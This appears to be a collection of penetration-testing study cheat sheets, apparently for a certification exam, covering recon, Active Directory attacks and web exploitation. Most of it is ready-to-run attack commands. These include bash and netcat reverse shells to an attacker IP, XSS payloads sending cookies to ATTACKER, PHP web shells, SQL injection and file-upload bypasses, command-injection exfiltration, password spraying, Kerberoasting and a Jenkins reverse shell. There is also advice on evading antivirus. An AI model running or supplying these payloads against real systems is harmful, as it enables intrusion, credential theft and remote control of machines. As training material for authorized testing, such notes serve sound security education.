title: Penetration Testing Process
summary: Understanding the phases of penetration testing: Planning, Information Gathering, Vulnerability Assessment, Exploitation, Post-Exploitation, and Reporting.
cheatsheet_md:
Phases

  • Pre-engagement: Scope, RoE, legal
  • Recon: Passive & active info gathering
  • Enumeration: Services, users, shares
  • Exploitation: Initial access
  • Post-Exploitation: Privesc, persistence, lateral movement
  • Reporting: Document findings

Key Commands

whois domain.com # Query domain registration info
dig domain.com ANY # Query all DNS records
host -t mx domain.com # Find mail servers
pitfalls_md:
• Skipping enumeration - always enumerate thoroughly
  • Not documenting as you go
  • Forgetting scope boundaries
exam_tips_md:
• Screenshot everything important
  • Keep detailed notes with timestamps
  • Document dead ends too

title: Network Enumeration with Nmap
summary: Master Nmap for host discovery, port scanning, service detection, and NSE scripts.
cheatsheet_md:
Host Discovery

nmap -sn 10.10.10.0/24 # Ping scan subnet for live hosts
nmap -Pn -sS 10.10.10.5 # SYN scan host, treat as online (skip ping)

Port Scanning

nmap -p- --min-rate 10000 10.10.10.5 # Fast full port scan (all 65535 ports)
nmap -sS -sV -sC -p 22,80,445 10.10.10.5 # Detailed scan (SYN, Version, Scripts) on found ports

Service/Version

nmap -sV --version-intensity 5 10.10.10.5 # Aggressive version detection

Scripts

nmap --script=vuln 10.10.10.5 # Run vulnerability scanning scripts
nmap --script=smb-enum-shares 10.10.10.5 # Enumerate SMB shares via script

Output

nmap -oA scan_results 10.10.10.5 # Save results in all formats (normal, grepable, xml)
pitfalls_md:
• Using -T5 on production networks
  • Forgetting UDP scans
  • Not saving output
exam_tips_md:
• Always do full port scan first
  • Use -oA to save all formats
  • Check UDP 53,161,500

title: Footprinting
summary: Gather information about target infrastructure including DNS, SMTP, FTP, SMB, NFS, SNMP, and more.
cheatsheet_md:
DNS

dig axfr @ns.domain.com domain.com # Attempt DNS Zone Transfer
dnsenum domain.com # Enumerate DNS info and subdomains
subfinder -d domain.com # Passive subdomain enumeration

SMB

smbclient -L //10.10.10.5 -N # List shares with null session
smbmap -H 10.10.10.5 # Map shares and permissions
enum4linux -a 10.10.10.5 # Run all enumeration checks (users, shares, groups)

SNMP

snmpwalk -v2c -c public 10.10.10.5 # Walk MIB tree with community string 'public'
onesixtyone -c community.txt 10.10.10.5 # Brute force community strings

NFS

showmount -e 10.10.10.5 # Show exported NFS shares
mount -t nfs 10.10.10.5:/share /mnt # Mount the share locally
pitfalls_md:
• Ignoring low-hanging fruit like anonymous FTP/SMB
  • Not trying default credentials
exam_tips_md:
• Always check for null sessions
  • Look for config files in shares

title: Web Information Gathering
summary: Techniques for web application reconnaissance including subdomain enumeration, directory fuzzing, and technology fingerprinting.
cheatsheet_md:
Subdomains

subfinder -d domain.com # Fast passive subdomain enumeration
amass enum -d domain.com # Comprehensive subdomain enumeration

Directory Fuzzing

ffuf -u http://10.10.10.5/FUZZ -w wordlist.txt # Fuzz directories with ffuf
gobuster dir -u http://10.10.10.5 -w wordlist.txt # Brute force directories with gobuster

Tech Stack

whatweb http://10.10.10.5 # Identify web technologies
wappalyzer # Browser extension for tech profiling

Virtual Hosts

ffuf -u http://10.10.10.5 -H 'Host: FUZZ.domain.com' -w vhosts.txt # Fuzz for virtual hosts
pitfalls_md:
• Not checking /robots.txt, /sitemap.xml
  • Missing hidden vhosts
exam_tips_md:
• Add discovered hostnames to /etc/hosts
  • Check both HTTP and HTTPS

title: Vulnerability Assessment
summary: Identify and prioritize vulnerabilities using automated scanners and manual testing.
cheatsheet_md:
Nmap Vuln Scripts

nmap --script vuln 10.10.10.5 # Run all NSE vulnerability scripts

Searchsploit

searchsploit apache 2.4 # Search for exploits locally
searchsploit -m 12345 # Mirror/copy exploit to current dir

Manual Checks

  • Check service versions against CVE databases
  • Test for default credentials
  • Look for misconfigurations
pitfalls_md:
• Relying only on automated scanners
  • Not verifying scanner results
exam_tips_md:
• Note all version numbers
  • Cross-reference with exploit-db

title: File Transfers
summary: Methods to transfer files between attacker and target systems.
cheatsheet_md:
Python HTTP Server

python3 -m http.server 8000 # Start simple HTTP server on port 8000

Download (Linux)

wget http://10.10.14.5:8000/file # Download file with wget
curl http://10.10.14.5:8000/file -o file # Download file with curl

Download (Windows)

certutil -urlcache -f http://10.10.14.5/file file # Download on Windows using certutil
powershell iwr -uri http://10.10.14.5/file -outfile file # Download using PowerShell Invoke-WebRequest

SMB

impacket-smbserver share . -smb2support # Start SMB server sharing current dir
copy \\10.10.14.5\share\file . # Copy file from SMB share on Windows

Base64

base64 file | tr -d '\n' # Encode file to base64 string
echo 'BASE64' | base64 -d > file # Decode base64 string back to file
pitfalls_md:
• Firewall blocking common ports
  • AV catching transfers
exam_tips_md:
• Have multiple methods ready
  • SMB often works when HTTP fails

title: Shells & Payloads
summary: Creating and catching reverse shells, bind shells, and web shells.
cheatsheet_md:
Reverse Shells

bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 # Bash reverse shell
nc -e /bin/bash 10.10.14.5 4444 # Netcat reverse shell (if -e available)
powershell -e BASE64_PAYLOAD # PowerShell encoded reverse shell

Listeners

nc -lvnp 4444 # Start Netcat listener on port 4444
rlwrap nc -lvnp 4444 # Listener with history/arrow keys support

Shell Upgrade

python3 -c 'import pty;pty.spawn("/bin/bash")' # Spawn TTY shell with Python
export TERM=xterm # Set terminal type
# Ctrl+Z, stty raw -echo; fg # Background, fix TTY, foreground

Web Shells

<?php system($_GET['cmd']); ?> # Basic PHP web shell
pitfalls_md:
• Not upgrading shells
  • Forgetting to URL encode
exam_tips_md:
• Always upgrade to PTY
  • Use rlwrap for arrow keys

title: Metasploit Framework
summary: Using Metasploit for exploitation, post-exploitation, and pivoting.
cheatsheet_md:
Basic Usage

msfconsole # Start Metasploit Framework
search type:exploit name:smb # Search for SMB exploits
use exploit/windows/smb/ms17_010_eternalblue # Select EternalBlue exploit
set RHOSTS 10.10.10.5 # Set target IP
set LHOST tun0 # Set listener interface
exploit # Run the exploit

Meterpreter

getuid # Show current user context
sysinfo # Show system information
hashdump # Dump password hashes
upload/download # Transfer files
portfwd add -l 8080 -p 80 -r 10.10.10.6 # Forward local port 8080 to remote 80

Post Modules

run post/windows/gather/enum_logged_on_users # Enumerate logged on users
run post/multi/recon/local_exploit_suggester # Suggest local exploits
pitfalls_md:
• Over-reliance on Metasploit
  • Not understanding what exploits do
exam_tips_md:
• Know manual methods too
  • Use for pivoting

title: Password Attacks
summary: Techniques for password cracking, brute forcing, and credential attacks.
cheatsheet_md:
Hashcat

hashcat -m 0 hash.txt wordlist.txt # Crack MD5 hashes
hashcat -m 1000 ntlm.txt rockyou.txt # Crack NTLM hashes
hashcat -m 13100 krb5tgs.txt wordlist.txt # Crack Kerberoast TGS hashes

John

john --wordlist=rockyou.txt hash.txt # Crack hashes with John
john --show hash.txt # Show cracked passwords

Hydra

hydra -l admin -P wordlist.txt ssh://10.10.10.5 # Brute force SSH
hydra -L users.txt -P pass.txt 10.10.10.5 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid" # Brute force web form

CrackMapExec

crackmapexec smb 10.10.10.5 -u user -p password # Test SMB credentials
crackmapexec smb 10.10.10.5 -u users.txt -p passwords.txt # Password spray SMB
pitfalls_md:
• Account lockouts
  • Using wrong hash mode
exam_tips_md:
• Try password spraying
  • Check for password reuse

title: Attacking Common Services
summary: Exploit techniques for FTP, SSH, SMB, RDP, SQL, and other services.
cheatsheet_md:
FTP (21)

ftp 10.10.10.5 # Connect to FTP server
anonymous/anonymous # Try anonymous login

SSH (22)

ssh user@10.10.10.5 # Connect via SSH with password
ssh -i id_rsa user@10.10.10.5 # Connect via SSH with private key

SMB (445)

smbclient //10.10.10.5/share -U user # Connect to SMB share
impacket-psexec user:pass@10.10.10.5 # Get shell via PsExec (needs admin)

WinRM (5985)

evil-winrm -i 10.10.10.5 -u user -p pass # Get shell via WinRM

MSSQL (1433)

impacket-mssqlclient user:pass@10.10.10.5 # Connect to MSSQL
xp_cmdshell 'whoami' # Execute command via xp_cmdshell
pitfalls_md:
• Ignoring non-standard ports
  • Not trying default creds
exam_tips_md:
• Always check for anonymous access
  • Look for credential reuse

title: Pivoting, Tunneling & Port Forwarding
summary: Techniques to access internal networks through compromised hosts.
cheatsheet_md:
SSH Tunneling

ssh -L 8080:10.10.10.6:80 user@10.10.10.5 # Local port forward (access remote service locally)
ssh -D 9050 user@10.10.10.5 # Dynamic port forward (SOCKS proxy)
ssh -R 8080:localhost:80 user@10.10.14.5 # Remote port forward (expose local service remotely)

Chisel

# Server
chisel server --reverse -p 8000 # Start Chisel server on attacker
# Client
chisel client 10.10.14.5:8000 R:socks # Connect from target to create SOCKS tunnel

Ligolo-ng

# Proxy
./proxy -selfcert # Start Ligolo proxy interface
# Agent
./agent -connect 10.10.14.5:11601 -ignore-cert # Connect Ligolo agent from target

Proxychains

proxychains nmap -sT 10.10.10.6 # Scan through proxy (must use TCP connect scan)
pitfalls_md:
• Forgetting to use -sT with proxychains
  • Not updating proxychains.conf
exam_tips_md:
• Ligolo-ng is faster than chisel
  • Double-check pivot routes

title: Active Directory Enumeration
summary: Enumerate AD environments to find attack paths.
cheatsheet_md:
BloodHound Collection

SharpHound.exe -c All --zipfilename bh.zip
impacket-bloodhound -u user -p pass -d corp.local -dc DC01.corp.local -c All

PowerView Key Queries

Get-DomainUser -SPN                # Kerberoastable users
Get-DomainUser -PreauthNotRequired # AS-REP Roastable
Get-DomainComputer -Unconstrained  # Unconstrained delegation
Get-DomainGroupMember 'Domain Admins'
Find-LocalAdminAccess              # Hosts where current user is local admin
Get-DomainPolicy | select -ExpandProperty SystemAccess  # Password policy

LDAP Enumeration

ldapsearch -x -H ldap://DC_IP -b 'DC=corp,DC=local' -D 'user@corp.local' -w 'pass' '(objectClass=user)'
nxc ldap DC_IP -u user -p pass --users
nxc ldap DC_IP -u user -p pass --groups
pitfalls_md:
• Running SharpHound from disk — AV detects SharpHound.exe by name. Rename to something benign or run the C# in-memory version.
  • Not checking password policy before spraying — Get-DomainPolicy first. Default lockout is 5 attempts. Spraying above threshold = mass account lockout.
  • Ignoring nested group membership — A user in GroupA where GroupA is in Domain Admins. BloodHound shows this; Get-DomainGroupMember -Recurse does too.
  • Missing service account SPNs — Service accounts are often over-privileged with weak passwords. Get-DomainUser -SPN reveals all Kerberoastable accounts.
exam_tips_md:
• BloodHound is the map — run it first with all collection methods before anything else. Mark every compromised account as owned to unlock path queries.
  • Find-LocalAdminAccess is a low-noise pivot finder — run from every compromised user account.
  • AS-REP Roasting doesn't require a password: impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -no-pass.
  • Always check for AS-REP + Kerberoasting before bruteforce — no lockout risk and gives hashes to crack offline.

title: Active Directory Attacks
summary: Common AD attack techniques: Kerberoasting, AS-REP Roasting, Pass-the-Hash, DCSync.
cheatsheet_md:
Kerberoasting

impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request -output hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt

AS-REP Roasting

impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -no-pass -format hashcat
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

Password Spraying AD

nxc smb DC_IP -u users.txt -p 'Password1' --continue-on-success
nxc smb DC_IP -u users.txt -p 'SeasonYear!' --continue-on-success

ACL Abuse

# GenericWrite on User -> Targeted Kerberoasting:
Set-DomainObject -Identity target -Set @{serviceprincipalname='fake/spn'}
impacket-GetUserSPNs -request -dc-ip DC_IP corp.local/owned:pass
pitfalls_md:
• Cracking Kerberoast hashes without rules — Add -r /usr/share/hashcat/rules/best64.rule. Service accounts often use Base+Complexity patterns.
  • Missing targeted Kerberoasting — GenericWrite on a user = set SPN = Kerberoast that user. BloodHound shows GenericWrite edges.
  • Not using --continue-on-success in spraying — Without it, nxc stops at first success. Miss additional valid accounts.
  • Spraying too fast — Add delay between attempts: nxc --jitter 1 to avoid lockout and detection patterns.
exam_tips_md:
• Kerberoast all SPNs immediately after gaining valid credentials — high-privilege service accounts crack to plaintext on common wordlists.
  • BloodHound GenericAll / GenericWrite edges on users = immediate escalation path via targeted Kerberoasting or forced password change.
  • ACL abuse chain: GenericWrite -> Kerberoast -> crack hash -> use plain password for full account access.
  • Password spray pattern: Season+Year (Winter2024!), Company+Year!, Company+123 — most common corporate password patterns.

title: Using Web Proxies
summary: Using Burp Suite and other proxies for web testing.
cheatsheet_md:
Burp Suite Essentials

# Scope: Target -> Scope -> Add domain
# Intercept: Proxy -> Intercept On
# Active scan: right-click request -> Scan
# Intruder positions: highlight param -> Add
# Repeater shortcut: Ctrl+R

Key Headers to Modify

X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
Referer: https://admin.target.com
Origin: https://trusted.com
Content-Type: application/json

Match & Replace (WAF Bypass)

Proxy -> Options -> Match and Replace
Add: User-Agent -> Googlebot/2.1
pitfalls_md:
• Not setting scope before scanning — Without scope limits, active scan hits every URL in history including third-party sites. Can cause issues in real engagements.
  • Missing HTTPS traffic — Install Burp CA in your browser. Without it, HTTPS sites show connection errors.
  • Not using Repeater for manual testing — Ctrl+R sends any request to Repeater. Essential for iterating on injections without re-browsing.
  • Forgetting Burp Collaborator for OOB — SSRF, XXE, blind SQLi, Log4Shell all require OOB callbacks. Burp Collaborator provides the DNS/HTTP server.
exam_tips_md:
• Always set scope first to avoid noise. Add target domain with wildcard: .*\.target\.com$
  • Burp Intruder Cluster Bomb for credential attacks: Position 1 = username list, Position 2 = password list.
  • Comparer (Ctrl+W) finds differences between responses — invaluable for blind SQLi and IDOR confirmation.
  • Turbo Intruder extension for rate-bypass testing — can send thousands of requests per second, bypassing per-request rate limits.

title: Attacking Web Apps with Ffuf
summary: Directory and parameter fuzzing with ffuf.
cheatsheet_md:
Directory/File Fuzzing

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://target.com/FUZZ -mc 200,301,302,403
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u http://target.com/FUZZ

DNS Subdomain Enum

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.target.com -H 'Host: FUZZ.target.com' -mc 200,302

Parameter Fuzzing

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://target.com/page?FUZZ=test' -mc 200,302

POST Data Fuzzing

ffuf -w wordlist.txt -u http://target.com/login -X POST -d 'username=FUZZ&password=test' -H 'Content-Type: application/x-www-form-urlencoded' -mc 302
pitfalls_md:
• Not filtering by size — Use -fs SIZE to hide the default 'not found' page size. Find it by running ffuf and noting the consistent response size for 404s.
  • Missing -recursion — By default ffuf doesn't recurse into found directories. Add -recursion -recursion-depth 2 for deeper enumeration.
  • Flooding server with concurrent requests — Default 40 threads can cause errors or rate limiting. Use -t 20 or lower for stability.
  • Forgetting extension fuzzing — Add -e .php,.bak,.txt,.html to catch backup files and scripts alongside directories.
exam_tips_md:
• Start with raft-medium-directories, then switch to big or raft-large for thorough enumeration on important targets.
  • VHost fuzzing: always add wordlist against Host header for virtual hosts — many targets serve different content on subdomains vs IP.
  • Combine directory + extension: -w dirs.txt -e .php,.bak,.config catches config backups (database.php.bak is a common critical find).
  • -o results.json -of json saves all findings for documentation — include raw ffuf output in appendix.

title: Login Brute Forcing
summary: Brute forcing web login forms and services.
cheatsheet_md:
Hydra HTTP POST

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target.com http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials' -t 30

Hydra SSH/FTP

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com

Medusa

medusa -h target.com -U users.txt -P passwords.txt -M ssh -t 5

Custom Wordlists

cewl http://target.com -d 3 -m 5 -w custom.txt
rules: $1 $! $@ Az'[A-Z]' c (hashcat rules)
pitfalls_md:
• Not identifying the fail string correctly — Hydra needs the exact failure message (Invalid credentials). Misidentifying causes false positives or misses successes.
  • Not using CeWL for custom wordlists — Company-specific terminology (product names, slogans) is often used in passwords and not in standard wordlists.
  • Bruteforcing without checking for lockout policy — Always check or infer lockout behavior. Most corporate apps lock after 3–5 failures.
  • Missing default credentials check — Always try admin:admin, admin:password, admin:[blank] before bruteforcing. Many internal tools use defaults.
exam_tips_md:
• Default credential list: admin:admin, admin:password, root:root, user:user, admin:1234. Try manually before automated bruteforce.
  • CeWL + hashcat rules = targeted wordlist. Run: cewl target.com -d 2 -m 6 | hashcat --stdout -r /usr/share/hashcat/rules/best64.rule > targeted.txt
  • Username enumeration: if 'User not found' vs 'Wrong password' — enumerate users first with just username field.
  • Document: tool used, target endpoint, wordlist, duration, result (credentials found). Include successful login screenshot.

title: SQL Injection Fundamentals
summary: Understanding and exploiting SQL injection vulnerabilities.
cheatsheet_md:
Detection

' -- classic
' OR 1=1 --
' OR 'a'='a
1; SELECT SLEEP(5)--  (MySQL time-based)
1'; WAITFOR DELAY '0:0:5'-- (MSSQL)

UNION SELECT Enumeration

# Column count:
' ORDER BY 1--
' ORDER BY 2--
# Union with correct columns:
' UNION SELECT NULL,NULL,NULL--
# Extract data:
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,username,password FROM users--

MySQL Specific

' UNION SELECT 1,@@version,3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
pitfalls_md:
• Not URL-encoding payloads in GET requests — Spaces become %20 or +, single quotes %27. Use Burp Repeater to handle encoding automatically.
  • Guessing column count instead of incrementing ORDER BY — Always increment ORDER BY 1, 2, 3... until error to confirm exact column count before UNION.
  • Assuming all databases are MySQL — MSSQL uses TOP/WAITFOR, Oracle needs FROM dual, PostgreSQL has pg_sleep. Fingerprint first.
  • Missing second-order SQLi — Payloads stored in DB and executed later. Test update endpoints and profile fields that are later queried.
exam_tips_md:
• Always start manual: inject ' into every parameter. Error message reveals DB type and confirms injection point before using sqlmap.
  • Time-based blind: SLEEP(5) for MySQL, WAITFOR DELAY '0:0:5' for MSSQL, pg_sleep(5) for PostgreSQL. Reliable when no visible output.
  • Out-of-file: MySQL load_file('/etc/passwd') and INTO OUTFILE '/var/www/html/shell.php' — SUPER/FILE privilege required.
  • Document: injection point (exact parameter), type (UNION/blind/time), DB type, tables extracted, escalation achieved (RCE via INTO OUTFILE).

title: SQLMap Essentials
summary: Automated SQL injection with SQLMap.
cheatsheet_md:
Basic Usage

sqlmap -u 'http://target.com/page?id=1' --batch
sqlmap -u 'http://target.com/page?id=1' --dbs
sqlmap -u 'http://target.com/page?id=1' -D dbname --tables
sqlmap -u 'http://target.com/page?id=1' -D dbname -T users --columns
sqlmap -u 'http://target.com/page?id=1' -D dbname -T users -C username,password --dump

POST Request

sqlmap -u 'http://target.com/login' --data='user=test&pass=test' -p user --batch

Burp Request File

sqlmap -r request.txt --batch --level=5 --risk=3

OS Interaction

sqlmap -r req.txt --os-shell  # Interactive OS shell (MySQL/MSSQL)
sqlmap -r req.txt --file-read=/etc/passwd
pitfalls_md:
• Running sqlmap without --batch in automated contexts — Use --batch for non-interactive runs. Otherwise it prompts and hangs.
  • Not using -r for complex requests — For requests with cookies, custom headers, or POSTbodieswith special characters, save from Burp and use -r request.txt.
  • Forgetting --level and --risk for thorough testing — Default level=1, risk=1 misses many injection points. Use --level=5 --risk=3 for complete coverage (slower).
  • Overlooking --os-shell capability — When FILE privilege is available, sqlmap can read files and write webshells for OS command execution.
exam_tips_md:
• Save the Burp request (right-click -> Save to file) and use sqlmap -r request.txt for reliable complex request handling.
  • --dump-all --exclude-sysdbs dumps every non-system database — good for comprehensive credential extraction after confirming injection.
  • --os-shell on MySQL with FILE privilege gives interactive command execution. Confirm: SHOW GRANTS shows FILE in privileges list.
  • Cookie injection: sqlmap -u 'http://target.com/' --cookie='session=*' --level=2 (asterisk marks injection parameter).

title: Cross-Site Scripting (XSS)
summary: Finding and exploiting XSS vulnerabilities.
cheatsheet_md:
Basic Detection

<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>

Cookie Theft

<script>document.location='http://ATTACKER/?c='+document.cookie</script>
<img src=x onerror="fetch('http://ATTACKER/?c='+document.cookie)">

Filter Bypass

<ScRiPt>alert(1)</sCrIpT>  (case)
<script>al\u0065rt(1)</script>  (unicode)
<svg/onload=alert(1)>  (no space)
javascript:alert(1)  (href attr)

DOM XSS

# Look for: innerHTML, document.write, eval, location.hash
# Payload in URL: http://target.com/#<img src=x onerror=alert(1)>
pitfalls_md:
• Using alert() in reports — alert() is only for proof of concept. Always demonstrate real impact: cookie theft, session hijacking, keylogging for the report.
  • Missing stored XSS in less obvious fields — Username, profile bio, address fields that display to admins are often vulnerable stored XSS points. Admin-targeted stored XSS = account takeover.
  • Not testing DOM XSS separately — DOM XSS doesn't go through the server so server-side scanning misses it. Manually review JavaScript source for dangerous sinks.
  • Ignoring CSP — Check Content-Security-Policy header. Strict CSP blocks inline scripts. Look for CSP bypass opportunities (nonces, unsafe-inline, data:).
exam_tips_md:
• Impact chain: stored XSS in admin panel -> steal admin session cookie -> account takeover. Document with cookie value in request and successful admin login using it.
  • CSP bypass: if unsafe-inline is allowed, basic payloads work. If strict-dynamic, find an allowed script source to inject into.
  • For the exam report: show the payload injected, the triggering context (e.g., admin views user list), the stolen cookie, and the resulting authenticated session.
  • BeEF framework hooks browsers for comprehensive XSS impact demonstration — shows what real attackers could do beyond alert().

title: File Inclusion
summary: Local and Remote File Inclusion vulnerabilities.
cheatsheet_md:
LFI Detection

?page=../../../etc/passwd
?page=....//....//....//etc/passwd
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  (URL encoded)
?page=php://filter/read=convert.base64-encode/resource=index.php

Log Poisoning -> RCE

# Inject PHP into User-Agent:
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/
# Include log file:
?page=/var/log/apache2/access.log&cmd=id

RFI

?page=http://10.10.14.5/shell.php
?page=\\10.10.14.5\share\shell.php  (Windows UNC)

PHP Wrappers

php://filter/convert.base64-encode/resource=config
php://input  (POST body as PHP)
data://text/plain;base64,BASE64_PHP_CODE
pitfalls_md:
• Not checking PHP wrappers — php://filter leaks PHP source in base64. Reveals DB credentials in config files even without RCE.
  • Forgetting Windows path separators — On Windows targets, use ..\..\..\windows\system32\drivers\etc\hosts or URL-encode backslashes.
  • Not trying null byte (%00) — In old PHP versions (< 5.3.4), null byte truncates extensions appended by the application: ?page=../etc/passwd%00
  • Log poisoning requires write+read — You need to inject into a log file the app reads. Apache, Nginx logs, PHP session files, SSH auth.log are common targets.
exam_tips_md:
• php://filter/read=convert.base64-encode/resource=config is always the first wrapper to try — leaks source code with credentials.
  • Log poisoning path: User-Agent injection -> include /var/log/apache2/access.log -> RCE. Verify log path with /proc/self/fd/2 or /var/log/nginx/access.log.
  • For RFI: ensure allow_url_include=On (verify with phpinfo() if accessible). Less common in modern PHP configurations.
  • Document: traversal payload, file read proof (first 5 lines of /etc/passwd), RCE escalation (whoami/id output), full exploitation chain.

title: File Upload Attacks
summary: Bypassing file upload restrictions.
cheatsheet_md:
Extension Bypass

shell.php5
shell.php.jpg
shell.pHp
shell.PhP
shell.php%00.jpg  (null byte, old PHP)
shell.phtml
shell.phar

Content-Type Bypass

# Change in Burp: Content-Type: image/jpeg (while keeping PHP payload)

Webshell Payloads

<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
# Minimal:
<?=system($_GET[0])?>

Magic Bytes

# Prepend GIF header:
GIF89a;<?php system($_GET['cmd']); ?>
# Rename: shell.gif.php or shell.php if GIF check is content-only
pitfalls_md:
• Not trying double extensions — shell.jpg.php — some servers serve based on last extension. Also try shell.php.jpg where PHP might still parse it based on MIME type.
  • Forgetting .htaccess upload — If you can upload .htaccess, add: AddType application/x-httpd-php .jpg — then upload shell.jpg and it executes as PHP.
  • Not finding the upload path — Webshell is useless if you can't access it. Enumerate /uploads/, /files/, /media/, /images/ — or check the response for the URL.
  • Missing SVG/XML upload vectors — SVG files can contain JavaScript (XSS) or XXE payloads. Always test SVG upload if PDF/image uploads are allowed.
exam_tips_md:
• .htaccess upload is the most reliable bypass: AddType application/x-httpd-php .jpg6 — then upload shell.jpg6. Works even when PHP extensions are blocked.
  • Always verify the upload path by checking the response JSON, page HTML, or source for the uploaded file's URL.
  • For the exam: demonstrate RCE from webshell (whoami, id, cat /etc/passwd) and upgrade to full reverse shell via: php -r 'exec("bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'");'
  • Document: bypass technique, request showing bypass in Burp, webshell URL, command execution output.

title: Command Injections
summary: OS command injection techniques.
cheatsheet_md:
Detection Payloads

; id
| id
&& id
`id`
$(id)
; ping -c 1 10.10.14.5
| ping -c 1 10.10.14.5
%0a id  (URL-encoded newline)

Blind Command Injection

# OOB DNS (use Burp Collaborator / interactsh):
; nslookup $(whoami).COLLAB_DOMAIN
; curl http://ATTACKER/$(whoami)
# Time-based:
; sleep 5

Filter Bypass

# No spaces:
{id}   -> IFS variable: ${IFS}id
$IFS   used as space: cat${IFS}/etc/passwd
# Backtick: `id`
# Env vars: $PATH | $HOME | cat /etc$HOME/../etc/passwd
pitfalls_md:
• Testing only ; separator — Try all separators: ;, |, &, &&, ||, newline (%0a), backtick. Different OS/shell combinations respond to different separators.
  • Missing blind injection — No visible output doesn't mean no injection. Always test OOB (pingback/DNS) and time-based (sleep 5) for blind confirmation.
  • Not URL-encoding in GET parameters — & in URLs is a parameter separator. Use %26 for literal ampersand in GET. Check encoding in Burp.
  • Forgetting Windows command separators — Windows: & cmd /c [command], | [command], && [command] (chain on success). ping -n 1 ATTACKER for callback (not ping -c).
exam_tips_md:
• OOB callback is the most reliable blind detection — set up nc -nlvp 80 or use Burp Collaborator. DNS-based: ; nslookup $(whoami).COLLABORATOR.
  • Upgrade from webshell/injection to full reverse shell: bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' (URL-encode in GET parameters).
  • Document: payload used, separator type, OOB callback evidence (IP+timestamp+command output in DNS query), full RCE chain.
  • Check for filter evasion needed: if semicolons filtered try newline %0a; if spaces filtered use ${IFS} or {command}.

title: Web Attacks
summary: SSRF, XXE, IDOR and other web attacks.
cheatsheet_md:
IDOR Testing

GET /api/user/1  -> change to /api/user/2, /api/user/3
GET /download?file=invoice_001.pdf -> try invoice_002.pdf
POST /api/order/canc {"order_id":"123"} -> use another user's order ID

XXE

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><user>&xxe;</user></root>

CSRF PoC

<form action="http://target.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
</form>
<script>document.forms[0].submit()</script>

SSRF

url=http://169.254.169.254/latest/meta-data/
url=http://127.0.0.1:8080/admin
url=gopher://127.0.0.1:6379/_PING
pitfalls_md:
• Missing indirect IDOR — IDOR via predictable filenames or reference numbers (invoice_001.pdf) — not just numeric IDs. Also test GUIDs — sometimes sequential or guessable.
  • Not testing XXE in file uploads — SVG, DOCX, XLSX, and PPTX files contain XML. Upload malicious versions to test XXE in parsers processing these formats.
  • Checking only GET for CSRF — POST-based CSRF is common. Also check PUT/DELETE — some frameworks don't validate CSRF tokens for these methods.
  • Not converting JSON to XML for XXE — If the app accepts both JSON and XML (Content-Type: text/xml), switch to XML and inject XXE payload.
exam_tips_md:
• IDOR + privilege escalation: access another user's data (horizontal) then try accessing admin-level resources (vertical IDOR).
  • XXE to SSRF: use XXE external entity to fetch internal URLs: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  • CSRF impact is highest on state-changing actions: password change, email change, fund transfer, admin actions. Demonstrate with a working PoC HTML page.
  • For all findings: show request, response, impact, and remediation. IDOR shows unauthorized data. CSRF shows unauthorized action.

title: Attacking Common Applications
summary: Exploiting CMS and common web applications.
cheatsheet_md:
WordPress

wpscan --url http://target.com -e u,p,t --api-token TOKEN
# Admin RCE: Appearance -> Theme Editor -> 404.php -> PHP shell
wpscan --url http://target.com -U admin -P rockyou.txt --password-attack xmlrpc

Joomla

joomscan --url http://target.com
# Admin panel: /administrator
# RCE: Extensions -> Templates -> Edit -> inject PHP

Jenkins

# RCE if admin: Manage Jenkins -> Script Console
Thread.start { 'id'.execute().text }.join()
# Groovy reverse shell:
'bash -c {echo,BASE64_CMD}|{base64,-d}|bash'.execute()

GitLab/GitHub

# Search for secrets in repos:
git log --all --oneline
git show COMMIT:path/to/file
# API: GET /api/v4/projects?private_token=TOKEN
pitfalls_md:
• Not checking default credentials on every CMS/service — admin:admin, admin:password, admin:[appname], jenkins:jenkins, tomcat:tomcat. Common apps are frequently deployed with defaults.
  • Skipping xmlrpc.php on WordPress — Even if admin login page blocks bruteforce, xmlrpc.php often has no rate limiting. wpscan --password-attack xmlrpc exploits this.
  • Missing Jenkins unauthenticated access — Older Jenkins versions allow anonymous access to Script Console. Always check /script directly.
  • Not checking exposed .git directory — /.git/ accessible on web server = full source code extraction with git-dumper. Often contains credentials in config files.
exam_tips_md:
• WordPress chain: wpscan enumerate -> find admin -> Theme Editor PHP injection -> webshell -> reverse shell. Reliable, well-documented attack path.
  • Jenkins Script Console (Groovy) gives OS execution as the jenkins service user. Upgrade to full reverse shell with bash one-liner.
  • Tomcat manager (with credentials): upload malicious .war file with msfvenom WAR payload -> deploy -> browse to trigger reverse shell.
  • For exposed .git: git-dumper http://target.com/.git/ ./extracted; then grep -r password ./extracted/ to find credentials.

title: Linux Privilege Escalation
